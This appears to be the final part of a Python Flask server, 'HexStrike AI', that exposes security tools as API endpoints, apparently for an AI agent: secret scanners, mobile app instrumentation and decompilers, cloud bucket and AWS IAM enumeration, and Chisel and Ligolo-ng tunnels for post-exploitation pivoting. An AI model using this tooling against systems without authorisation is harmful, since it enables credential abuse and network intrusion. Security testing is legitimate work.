        duration = sanitize_input(params.get("duration", "30s"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        token_flag = f"-token {token}" if token else ""
        cmd = f"interactsh-client -s {server} {token_flag} -ps -json -duration {duration} {additional_args}".strip()
        logger.info(f"📡 Interactsh OOB listener: {server} (duration: {duration})")
        result = execute_command_with_recovery("interactsh-client", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# SECRETS & SAST TOOLS — NEW (v7.0)
# ============================================================================

@app.route("/api/tools/trufflehog", methods=["POST"])
@require_api_key
def trufflehog_scan():
    """TruffleHog — Find secrets in git repos, S3, GitHub, filesystem."""
    try:
        params = request.json or {}
        target = sanitize_input(params.get("target", ""))
        source = sanitize_input(params.get("source", "git"))  # git/s3/github/filesystem/gitlab
        only_verified = params.get("only_verified", False)
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not target:
            return jsonify({"error": "target is required"}), 400
        verified_flag = "--only-verified" if only_verified else ""
        cmd = f"trufflehog {source} '{target}' --json {verified_flag} {additional_args}".strip()
        logger.info(f"🐷 TruffleHog [{source}]: {target}")
        result = execute_command_with_recovery("trufflehog", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/gitleaks", methods=["POST"])
@require_api_key
def gitleaks_scan():
    """Gitleaks — Detect secrets and sensitive data in git repositories."""
    try:
        params = request.json or {}
        path = sanitize_input(params.get("path", "."))
        config = sanitize_input(params.get("config", ""))
        report_format = sanitize_input(params.get("report_format", "json"))
        report_path = sanitize_input(params.get("report_path", f"/tmp/gitleaks_report_{int(time.time())}.json"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        config_flag = f"--config {config}" if config else ""
        cmd = f"gitleaks detect --source '{path}' {config_flag} --report-format {report_format} --report-path {report_path} {additional_args}".strip()
        logger.info(f"🔍 Gitleaks: {path}")
        result = execute_command_with_recovery("gitleaks", cmd, params)
        result["report_path"] = report_path
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/semgrep", methods=["POST"])
@require_api_key
def semgrep_scan():
    """Semgrep — Static application security testing (SAST)."""
    try:
        params = request.json or {}
        path = sanitize_input(params.get("path", "."))
        config = sanitize_input(params.get("config", "auto"))  # auto / p/owasp-top-ten / etc.
        lang = sanitize_input(params.get("lang", ""))
        severity = sanitize_input(params.get("severity", ""))
        output_format = sanitize_input(params.get("output_format", "json"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        lang_flag = f"--lang {lang}" if lang else ""
        sev_flag = f"--severity {severity}" if severity else ""
        cmd = f"semgrep --config {config} {lang_flag} {sev_flag} --{output_format} '{path}' {additional_args}".strip()
        logger.info(f"🔬 Semgrep SAST: {path} (config: {config})")
        result = execute_command_with_recovery("semgrep", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# MOBILE SECURITY TOOLS — NEW (v7.0)
# ============================================================================

@app.route("/api/tools/frida", methods=["POST"])
@require_api_key
def frida_instrument():
    """Frida — Dynamic instrumentation toolkit for mobile and native apps."""
    try:
        params = request.json or {}
        mode = sanitize_input(params.get("mode", "ps"))  # ps / spawn / attach / script
        device = sanitize_input(params.get("device", "usb"))
        app = sanitize_input(params.get("app", ""))
        script = sanitize_input(params.get("script", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        device_flag = f"-D {device}" if device not in ("usb",) else f"-U"
        if mode == "ps":
            cmd = f"frida-ps {device_flag} {additional_args}"
        elif mode == "spawn" and app:
            cmd = f"frida {device_flag} -f '{app}' {'-l ' + script if script else ''} {additional_args}"
        elif mode == "attach" and app:
            cmd = f"frida {device_flag} '{app}' {'-l ' + script if script else ''} {additional_args}"
        else:
            cmd = f"frida-ps {device_flag} {additional_args}"
        logger.info(f"🔬 Frida [{mode}]: {app or 'list processes'}")
        result = execute_command_with_recovery("frida", cmd.strip(), params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/objection", methods=["POST"])
@require_api_key
def objection_scan():
    """Objection — Runtime mobile security exploration (Android/iOS)."""
    try:
        params = request.json or {}
        package = sanitize_input(params.get("package", ""))
        command = sanitize_input(params.get("command", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not package:
            return jsonify({"error": "package is required"}), 400
        cmd = f"objection --gadget '{package}' explore --startup-command '{command}' {additional_args}".strip()
        logger.info(f"🕵️  Objection: {package}")
        result = execute_command_with_recovery("objection", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/apktool", methods=["POST"])
@require_api_key
def apktool_analyze():
    """Apktool — APK decompilation and repackaging."""
    try:
        params = request.json or {}
        apk_path = sanitize_input(params.get("apk_path", ""))
        output_dir = sanitize_input(params.get("output_dir", f"/tmp/apktool_out_{int(time.time())}"))
        mode = sanitize_input(params.get("mode", "decode"))  # decode / build
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not apk_path:
            return jsonify({"error": "apk_path is required"}), 400
        if mode == "decode":
            cmd = f"apktool d '{apk_path}' -o {output_dir} -f {additional_args}"
        else:
            cmd = f"apktool b '{apk_path}' -o {output_dir} {additional_args}"
        logger.info(f"📦 Apktool [{mode}]: {apk_path}")
        result = execute_command_with_recovery("apktool", cmd.strip(), params)
        result["output_dir"] = output_dir
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/apkleaks", methods=["POST"])
@require_api_key
def apkleaks_scan():
    """APKLeaks — Find hardcoded secrets and sensitive data in APK files."""
    try:
        params = request.json or {}
        apk_path = sanitize_input(params.get("apk_path", ""))
        output_format = sanitize_input(params.get("output_format", "json"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not apk_path:
            return jsonify({"error": "apk_path is required"}), 400
        fmt_flag = f"-f {output_format}" if output_format else ""
        cmd = f"apkleaks -f '{apk_path}' {fmt_flag} {additional_args}".strip()
        logger.info(f"🔑 APKLeaks: {apk_path}")
        result = execute_command_with_recovery("apkleaks", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/jadx", methods=["POST"])
@require_api_key
def jadx_decompile():
    """JADX — Java/Kotlin decompiler for APK, DEX, and AAR files."""
    try:
        params = request.json or {}
        apk_path = sanitize_input(params.get("apk_path", ""))
        output_dir = sanitize_input(params.get("output_dir", f"/tmp/jadx_out_{int(time.time())}"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not apk_path:
            return jsonify({"error": "apk_path is required"}), 400
        cmd = f"jadx -d '{output_dir}' '{apk_path}' {additional_args}".strip()
        logger.info(f"☕ JADX decompile: {apk_path}")
        result = execute_command_with_recovery("jadx", cmd, params)
        result["output_dir"] = output_dir
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# CLOUD SECURITY TOOLS — NEW (v7.0)
# ============================================================================

@app.route("/api/tools/cloudbrute", methods=["POST"])
@require_api_key
def cloudbrute_scan():
    """CloudBrute — Cloud storage brute force (S3, GCS, Azure Blob)."""
    try:
        params = request.json or {}
        company = sanitize_input(params.get("company", ""))
        wordlist = sanitize_input(params.get("wordlist", "/usr/share/seclists/Discovery/Web-Content/common.txt"))
        provider = sanitize_input(params.get("provider", "aws"))  # aws / gcp / azure
        output = sanitize_input(params.get("output", f"/tmp/cloudbrute_{int(time.time())}.txt"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not company:
            return jsonify({"error": "company is required"}), 400
        cmd = f"cloudbrute -t {provider} -k '{company}' -w {wordlist} -o {output} {additional_args}".strip()
        logger.info(f"☁️  CloudBrute [{provider}]: {company}")
        result = execute_command_with_recovery("cloudbrute", cmd, params)
        result["output"] = output
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/s3scanner", methods=["POST"])
@require_api_key
def s3scanner_scan():
    """S3Scanner — S3 bucket enumeration and misconfiguration detection."""
    try:
        params = request.json or {}
        bucket = sanitize_input(params.get("bucket", ""))
        threads = sanitize_input(params.get("threads", "4"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not bucket:
            return jsonify({"error": "bucket is required"}), 400
        cmd = f"s3scanner scan --bucket '{bucket}' --threads {threads} {additional_args}".strip()
        logger.info(f"🪣  S3Scanner: {bucket}")
        result = execute_command_with_recovery("s3scanner", cmd, params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/enumerate-iam", methods=["POST"])
@require_api_key
def enumerate_iam():
    """enumerate-iam — Discover attached IAM permissions for AWS credentials."""
    try:
        params = request.json or {}
        access_key = sanitize_input(params.get("access_key", ""))
        secret_key = sanitize_input(params.get("secret_key", ""))
        session_token = sanitize_input(params.get("session_token", ""))
        region = sanitize_input(params.get("region", "us-east-1"))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if not access_key or not secret_key:
            return jsonify({"error": "access_key and secret_key are required"}), 400
        env_vars = f"AWS_ACCESS_KEY_ID={access_key} AWS_SECRET_ACCESS_KEY={secret_key}"
        if session_token:
            env_vars += f" AWS_SESSION_TOKEN={session_token}"
        cmd = f"{env_vars} python3 -m enumerate_iam.main --access-key {access_key} --secret-key {secret_key}"
        if session_token:
            cmd += f" --session-token {session_token}"
        cmd += f" --region {region} {additional_args}"
        logger.info(f"🔐 enumerate-iam: {access_key[:8]}***")
        result = execute_command_with_recovery("enumerate-iam", cmd.strip(), params)
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ============================================================================
# POST-EXPLOITATION & PIVOTING — NEW (v7.0)
# ============================================================================

@app.route("/api/tools/ligolo-ng", methods=["POST"])
@require_api_key
def ligolo_ng():
    """Ligolo-ng — Advanced TCP/UDP tunneling for network pivoting."""
    try:
        params = request.json or {}
        mode = sanitize_input(params.get("mode", "proxy"))  # proxy / agent
        listen_addr = sanitize_input(params.get("listen_addr", "0.0.0.0:11601"))
        target = sanitize_input(params.get("target", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if mode == "proxy":
            cmd = f"ligolo-ng proxy -selfcert -laddr {listen_addr} {additional_args}"
        elif mode == "agent" and target:
            scope_manager.validate_or_raise(target)
            cmd = f"ligolo-ng agent -connect {target} -ignore-cert {additional_args}"
        else:
            return jsonify({"error": "For agent mode, target (proxy address) is required"}), 400
        logger.info(f"🔀 Ligolo-ng [{mode}]: {listen_addr or target}")
        result = execute_command_with_recovery("ligolo-ng", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tools/chisel", methods=["POST"])
@require_api_key
def chisel_tunnel():
    """Chisel — Fast TCP/UDP tunneling over HTTP."""
    try:
        params = request.json or {}
        mode = sanitize_input(params.get("mode", "server"))  # server / client
        host = sanitize_input(params.get("host", "0.0.0.0"))
        port = sanitize_input(params.get("port", "8080"))
        tunnels = sanitize_input(params.get("tunnels", ""))
        additional_args = sanitize_input(params.get("additional_args", ""))
        if mode == "server":
            cmd = f"chisel server --host {host} --port {port} --reverse {additional_args}"
        elif mode == "client":
            scope_manager.validate_or_raise(host)
            cmd = f"chisel client {host}:{port} {tunnels} {additional_args}"
        else:
            return jsonify({"error": "mode must be 'server' or 'client'"}), 400
        logger.info(f"🔧 Chisel [{mode}]: {host}:{port}")
        result = execute_command_with_recovery("chisel", cmd.strip(), params)
        return jsonify(result)
    except ScopeViolationError as e:
        return jsonify({"error": str(e), "success": False, "scope_violation": True}), 403
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# Create the banner after all classes are defined
BANNER = ModernVisualEngine.create_banner()

if __name__ == "__main__":
    # Display the beautiful new banner
    print(BANNER)

    parser = argparse.ArgumentParser(description="Run the HexStrike AI API Server")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--port", type=int, default=API_PORT, help=f"Port for the API server (default: {API_PORT})")
    args = parser.parse_args()

    if args.debug:
        DEBUG_MODE = True
        logger.setLevel(logging.DEBUG)

    if args.port != API_PORT:
        API_PORT = args.port

    # Enhanced startup messages with beautiful formatting
    startup_info = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🚀 Starting HexStrike AI Tools API Server{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}🌐 Port:{ModernVisualEngine.COLORS['RESET']} {API_PORT}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}🔧 Debug Mode:{ModernVisualEngine.COLORS['RESET']} {DEBUG_MODE}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}💾 Cache Size:{ModernVisualEngine.COLORS['RESET']} {CACHE_SIZE} | TTL: {CACHE_TTL}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['TERMINAL_GRAY']}⏱️  Command Timeout:{ModernVisualEngine.COLORS['RESET']} {COMMAND_TIMEOUT}s
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}✨ Enhanced Visual Engine:{ModernVisualEngine.COLORS['RESET']} Active
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']}  {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}{ModernVisualEngine.COLORS['BOLD']}★  Modified by Yakychan  ★{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""

    for line in startup_info.strip().split('\n'):
        if line.strip():
            logger.info(line)

    # Auto-update nuclei templates if overdue (runs in background thread, non-blocking)
    import threading
    threading.Thread(target=_nuclei_auto_update_on_startup, daemon=True).start()

    app.run(host="0.0.0.0", port=API_PORT, debug=DEBUG_MODE)
